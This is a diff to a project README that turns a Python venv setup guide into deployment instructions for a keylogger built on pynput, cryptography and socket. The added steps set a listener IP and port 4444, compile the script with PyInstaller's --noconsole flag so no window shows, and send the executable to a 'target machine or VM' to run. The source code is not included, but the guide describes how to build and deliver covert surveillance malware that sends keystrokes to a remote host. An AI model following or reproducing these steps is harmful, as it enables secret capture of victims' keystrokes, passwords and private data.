@@ -1,13 +1,34 @@
 # Python Virtual Environment Setup & Dependency Installation
 
-This guide explains how to create a Python virtual environment (venv) and install the required dependencies for this project.
+This guide explains how to create a Python virtual environment (venv) and install the required dependencies for this project. **It is recommended to use this setup inside a virtual machine (VM)** for safety, as this project involves a keylogger.
 
 ## Prerequisites
 
 * Python **3.8 or newer** installed
 * `pip` available (usually bundled with Python)
 
-You can verify your Python installation with:
+### Installing pip (if not already installed)
+
+#### On Linux / macOS
+
+```bash
+sudo apt update
+sudo apt install python3-pip  # Debian/Ubuntu
+```
+
+```bash
+brew install python  # macOS with Homebrew, pip comes bundled
+```
+
+#### On Windows
+
+Download the [get-pip.py](https://bootstrap.pypa.io/get-pip.py) script and run:
+
+```bash
+python get-pip.py
+```
+
+Verify installation:
 
 ```bash
 python --version
@@ -78,11 +99,11 @@ pip install pynput cryptography
 
 ### Notes on Standard Libraries
 
-The following modules **do not need to be installed** because they are part of Python’s standard library:
+The following module **does not need to be installed** because it is part of Python’s standard library:
 
 * `socket`
 
-You can import them directly in your code:
+You can import it directly in your code:
 
 ```python
 import socket
@@ -90,7 +111,32 @@ import socket
 
 ---
 
-## Step 5: Verify Installation
+## Step 5: Configure Network Settings
+
+Before compiling, open `keylogger.py` and **change the IP address and port number** to match your server or listener configuration.
+
+Example (adjust values as needed):
+
+```python
+SERVER_IP = "192.168.56.10"
+SERVER_PORT = 4444
+```
+
+---
+
+## Step 6: Compile Keylogger Script
+
+For safe execution, the `keylogger.py` script should be compiled using PyInstaller:
+
+```bash
+pyinstaller --onefile --noconsole keylogger.py
+```
+
+After compilation, the executable will be located in the `dist` folder. Send this executable to the target machine or VM and run it there.
+
+---
+
+## Step 7: Verify Installation
 
 You can verify that the packages are installed correctly by running:
 
@@ -126,8 +172,9 @@ deactivate
 
 ## Summary
 
-* `venv` is used to isolate project dependencies
+* Use a VM for safe testing
+* `venv` isolates project dependencies
+* Install `pip` if necessary
 * `pynput` and `cryptography` must be installed via `pip`
-* `socket` are built-in Python libraries
-
-Your environment is now ready for development.
+* `socket` is a built-in Python library
+* Compile `keylogger.py` with PyInstaller and run the executable on the target machine or VM
